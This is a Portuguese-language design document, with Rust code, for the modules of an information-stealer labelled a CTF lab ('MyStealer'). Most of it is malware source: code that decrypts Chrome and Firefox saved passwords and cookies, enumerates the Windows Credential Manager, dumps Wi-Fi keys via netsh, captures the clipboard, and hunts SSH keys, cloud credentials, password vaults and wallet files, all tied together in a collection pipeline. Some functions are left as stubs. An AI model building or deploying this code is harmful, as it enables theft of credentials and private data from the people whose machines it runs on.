# 📦 Módulos - MyStealer CTF Lab

## Visão Geral dos Módulos

| Módulo | Descrição | Windows | Linux | Prioridade |
|--------|-----------|:-------:|:-----:|:----------:|
| SystemInfo | Informações do sistema | ✅ | ✅ | Alta |
| BrowserCollector | Dados de navegadores | ✅ | ✅ | Alta |
| ClipboardCollector | Área de transferência | ✅ | ✅ | Média |
| FileScanner | Busca arquivos sensíveis | ✅ | ✅ | Média |
| CredentialCollector | Credenciais armazenadas | ✅ | ⚠️ | Alta |
| NetworkInfo | Informações de rede | ✅ | ✅ | Baixa |

---

## 1. SystemInfo Module

Coleta informações básicas do sistema operacional.

### Dados Coletados

```rust
pub struct SystemInfo {
    // Identificação
    pub hostname: String,
    pub username: String,
    pub os_name: String,
    pub os_version: String,
    pub os_arch: String,
    
    // Hardware
    pub cpu_model: String,
    pub cpu_cores: u32,
    pub ram_total_mb: u64,
    pub ram_available_mb: u64,
    
    // Rede
    pub local_ip: String,
    pub mac_address: String,
    
    // Privilégios
    pub is_admin: bool,
    pub is_elevated: bool,
    
    // Ambiente
    pub timezone: String,
    pub locale: String,
    pub uptime_seconds: u64,
}
```

### Implementação

```rust
// src/collectors/system_info.rs

use crate::collectors::{Collector, CollectedData, CollectorError};

pub struct SystemInfoCollector;

impl Collector for SystemInfoCollector {
    fn name(&self) -> &str {
        "system_info"
    }
    
    fn collect(&self) -> Result<CollectedData, CollectorError> {
        let info = SystemInfo {
            hostname: Self::get_hostname()?,
            username: Self::get_username()?,
            os_name: Self::get_os_name(),
            os_version: Self::get_os_version(),
            // ... demais campos
        };
        
        Ok(CollectedData::System(info))
    }
    
    fn is_supported(&self) -> bool {
        true // Suportado em todos os SOs
    }
    
    fn priority(&self) -> u8 {
        100 // Alta prioridade
    }
}

impl SystemInfoCollector {
    #[cfg(windows)]
    fn get_hostname() -> Result<String, CollectorError> {
        use windows::Win32::System::SystemInformation::GetComputerNameW;
        // Implementação Windows
    }
    
    #[cfg(unix)]
    fn get_hostname() -> Result<String, CollectorError> {
        use nix::unistd::gethostname;
        // Implementação Unix
    }
}
```

---

## 2. BrowserCollector Module

Coleta dados de navegadores (cookies, histórico, senhas salvas).

### Navegadores Suportados

- Google Chrome
- Mozilla Firefox
- Microsoft Edge
- Brave
- Opera

### Estrutura de Dados

```rust
pub struct BrowserData {
    pub browser_name: String,
    pub browser_version: String,
    pub profiles: Vec<BrowserProfile>,
}

pub struct BrowserProfile {
    pub profile_name: String,
    pub cookies: Vec<Cookie>,
    pub history: Vec<HistoryEntry>,
    pub saved_passwords: Vec<SavedPassword>,
    pub autofill: Vec<AutofillEntry>,
}

pub struct Cookie {
    pub domain: String,
    pub name: String,
    pub value: String,  // Criptografado
    pub expires: Option<DateTime<Utc>>,
    pub is_secure: bool,
    pub is_http_only: bool,
}

pub struct SavedPassword {
    pub url: String,
    pub username: String,
    pub password: String,  // Criptografado
    pub created_at: DateTime<Utc>,
}
```

### Caminhos dos Navegadores

```rust
// Windows
const CHROME_PATH_WIN: &str = r"%LOCALAPPDATA%\Google\Chrome\User Data";
const FIREFOX_PATH_WIN: &str = r"%APPDATA%\Mozilla\Firefox\Profiles";
const EDGE_PATH_WIN: &str = r"%LOCALAPPDATA%\Microsoft\Edge\User Data";

// Linux
const CHROME_PATH_LINUX: &str = "~/.config/google-chrome";
const FIREFOX_PATH_LINUX: &str = "~/.mozilla/firefox";
```

### Decriptação de Senhas

#### Chrome/Edge (Windows)

```rust
// Chrome usa DPAPI no Windows
pub fn decrypt_chrome_password(encrypted: &[u8]) -> Result<String, CryptoError> {
    // 1. Verificar prefixo "v10" ou "v11"
    // 2. Extrair IV (12 bytes após prefixo)
    // 3. Extrair payload criptografado
    // 4. Descriptografar com AES-GCM usando chave do Local State
    
    let prefix = &encrypted[..3];
    if prefix == b"v10" || prefix == b"v11" {
        let iv = &encrypted[3..15];
        let payload = &encrypted[15..];
        
        let key = get_chrome_key()?; // Do arquivo Local State
        decrypt_aes_gcm(&key, iv, payload)
    } else {
        // DPAPI legacy
        decrypt_dpapi(encrypted)
    }
}
```

#### Firefox

```rust
// Firefox usa NSS/SQLite
pub fn decrypt_firefox_password(profile_path: &Path) -> Result<Vec<SavedPassword>, CryptoError> {
    // 1. Ler key4.db para master key
    // 2. Ler logins.json
    // 3. Descriptografar usando 3DES-CBC ou AES
    
    let key_db = profile_path.join("key4.db");
    let logins = profile_path.join("logins.json");
    
    // Implementação...
}
```

---

## 3. ClipboardCollector Module

Monitora e coleta conteúdo da área de transferência.

### Estrutura

```rust
pub struct ClipboardData {
    pub entries: Vec<ClipboardEntry>,
    pub collection_duration: Duration,
}

pub struct ClipboardEntry {
    pub content: ClipboardContent,
    pub timestamp: DateTime<Utc>,
    pub format: ClipboardFormat,
}

pub enum ClipboardContent {
    Text(String),
    Image(Vec<u8>),  // PNG encoded
    Files(Vec<PathBuf>),
    Html(String),
}

pub enum ClipboardFormat {
    UnicodeText,
    Bitmap,
    FileList,
    Html,
    Rtf,
}
```

### Implementação

```rust
#[cfg(windows)]
pub fn get_clipboard_text() -> Result<String, ClipboardError> {
    use windows::Win32::System::DataExchange::{
        OpenClipboard, GetClipboardData, CloseClipboard,
    };
    use windows::Win32::System::Memory::GlobalLock;
    
    unsafe {
        OpenClipboard(None)?;
        
        let handle = GetClipboardData(CF_UNICODETEXT)?;
        let ptr = GlobalLock(handle);
        
        let text = /* converter ptr para String */;
        
        CloseClipboard()?;
        Ok(text)
    }
}

#[cfg(unix)]
pub fn get_clipboard_text() -> Result<String, ClipboardError> {
    // Usar xclip, xsel, ou wl-paste
    use std::process::Command;
    
    let output = Command::new("xclip")
        .args(["-selection", "clipboard", "-o"])
        .output()?;
        
    Ok(String::from_utf8_lossy(&output.stdout).to_string())
}
```

---

## 4. FileScanner Module

Busca arquivos sensíveis no sistema.

### Padrões de Busca

```rust
pub struct FileScanConfig {
    /// Diretórios para escanear
    pub target_dirs: Vec<PathBuf>,
    
    /// Extensões de interesse
    pub extensions: Vec<String>,
    
    /// Padrões de nome (regex)
    pub name_patterns: Vec<Regex>,
    
    /// Tamanho máximo para coletar
    pub max_file_size: u64,
    
    /// Profundidade máxima de diretórios
    pub max_depth: u32,
}

// Configuração padrão
impl Default for FileScanConfig {
    fn default() -> Self {
        Self {
            target_dirs: vec![
                dirs::home_dir().unwrap(),
                dirs::document_dir().unwrap(),
                dirs::desktop_dir().unwrap(),
            ],
            extensions: vec![
                "txt", "doc", "docx", "pdf",
                "key", "pem", "ppk", "kdbx",
                "wallet", "json", "env",
            ].into_iter().map(String::from).collect(),
            name_patterns: vec![
                Regex::new(r"(?i)password").unwrap(),
                Regex::new(r"(?i)secret").unwrap(),
                Regex::new(r"(?i)credential").unwrap(),
                Regex::new(r"(?i)wallet").unwrap(),
                Regex::new(r"(?i)\.env").unwrap(),
            ],
            max_file_size: 10 * 1024 * 1024, // 10MB
            max_depth: 5,
        }
    }
}
```

### Dados Coletados

```rust
pub struct FileSystemData {
    pub scanned_files: u64,
    pub matched_files: Vec<MatchedFile>,
    pub scan_duration: Duration,
}

pub struct MatchedFile {
    pub path: PathBuf,
    pub size: u64,
    pub modified: DateTime<Utc>,
    pub match_reason: MatchReason,
    pub content_preview: Option<String>,  // Primeiros 1KB
    pub hash: String,  // SHA256
}

pub enum MatchReason {
    Extension(String),
    NamePattern(String),
    ContentMatch(String),
}
```

---

## 5. CredentialCollector Module

Coleta credenciais armazenadas no sistema.

### Windows Credential Manager

```rust
#[cfg(windows)]
pub struct WindowsCredentials {
    pub generic_credentials: Vec<GenericCredential>,
    pub domain_credentials: Vec<DomainCredential>,
}

pub fn collect_windows_credentials() -> Result<WindowsCredentials, CollectorError> {
    use windows::Win32::Security::Credentials::{
        CredEnumerateW, CredFree, CREDENTIALW,
    };
    
    unsafe {
        let mut count: u32 = 0;
        let mut credentials: *mut *mut CREDENTIALW = std::ptr::null_mut();
        
        CredEnumerateW(
            None,
            CRED_ENUMERATE_ALL_CREDENTIALS,
            &mut count,
            &mut credentials,
        )?;
        
        // Processar credenciais...
        
        CredFree(credentials as *mut _);
        
        Ok(WindowsCredentials { /* ... */ })
    }
}
```

### Linux Keyring

```rust
#[cfg(unix)]
pub fn collect_linux_credentials() -> Result<LinuxCredentials, CollectorError> {
    // Caminhos comuns de credenciais
    let credential_paths = [
        "~/.ssh/",
        "~/.gnupg/",
        "~/.aws/credentials",
        "~/.config/gcloud/",
        "~/.kube/config",
    ];
    
    // Tentar acessar GNOME Keyring ou KWallet
    // via D-Bus ou secret-tool
}
```

---

## 6. NetworkInfo Module

Coleta informações de rede.

### Dados Coletados

```rust
pub struct NetworkData {
    pub interfaces: Vec<NetworkInterface>,
    pub wifi_networks: Vec<WifiNetwork>,
    pub routing_table: Vec<RouteEntry>,
    pub dns_servers: Vec<String>,
    pub active_connections: Vec<Connection>,
}

pub struct NetworkInterface {
    pub name: String,
    pub mac_address: String,
    pub ipv4: Option<String>,
    pub ipv6: Option<String>,
    pub is_up: bool,
    pub mtu: u32,
}

pub struct WifiNetwork {
    pub ssid: String,
    pub bssid: String,
    pub password: Option<String>,  // Se disponível
    pub auth_type: String,
    pub signal_strength: i32,
}
```

### Coleta de Senhas WiFi (Windows)

```rust
#[cfg(windows)]
pub fn get_wifi_passwords() -> Result<Vec<WifiNetwork>, CollectorError> {
    // Usando netsh
    let output = Command::new("netsh")
        .args(["wlan", "show", "profiles"])
        .output()?;
    
    // Parsear perfis e obter senhas
    for profile in profiles {
        let password_output = Command::new("netsh")
            .args([
                "wlan", "show", "profile",
                &format!("name={}", profile),
                "key=clear"
            ])
            .output()?;
        
        // Extrair senha...
    }
}
```

---

## Pipeline de Coleta

```rust
pub async fn run_collection_pipeline(
    config: &Config
) -> Result<CollectedData, PipelineError> {
    let collectors = initialize_collectors(config);
    
    // Execução paralela
    let results: Vec<_> = futures::future::join_all(
        collectors.iter()
            .filter(|c| c.is_supported())
            .sorted_by_key(|c| std::cmp::Reverse(c.priority()))
            .map(|c| async move {
                tracing::info!("Running collector: {}", c.name());
                c.collect()
            })
    ).await;
    
    // Agregar resultados
    let mut collected = CollectedData::new();
    for result in results {
        match result {
            Ok(data) => collected.merge(data),
            Err(e) => tracing::warn!("Collector failed: {}", e),
        }
    }
    
    Ok(collected)
}
```

---

## Próximos Passos

Ver [TECHNIQUES.md](TECHNIQUES.md) para técnicas avançadas e TTPs.

